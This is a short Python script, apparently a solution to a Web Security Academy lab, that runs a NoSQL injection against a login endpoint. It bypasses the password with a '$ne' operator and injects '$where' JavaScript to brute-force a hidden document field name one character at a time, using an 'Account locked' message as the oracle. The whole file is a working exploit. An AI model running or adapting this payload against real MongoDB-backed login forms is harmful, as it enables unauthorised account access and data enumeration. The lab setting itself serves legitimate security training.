import grequests
from string import ascii_lowercase, ascii_uppercase, digits

url = "https://0a15004f0451f37c81c643f700f80022.web-security-academy.net/login"

data_json = {
    "username": "carlos",
    "password": {"$ne":"hello"},
    "$where": "Object.keys(this)[3].match('^.{0}.*')"
}

row_name = ""

while True:
    for c in "-_" + ascii_lowercase + ascii_uppercase + digits:
        row = row_name + c
        payload = "Object.keys(this)[4].match('^.{0}" + row + ".*')"
        data_json["$where"] = payload
        req = grequests.post(url, json=data_json, allow_redirects=False)
        res = grequests.map([req])[0]
        if "Account locked" in res.text:
            row_name += c
            print(row_name)
            break
    
    if row_name == "":
        break

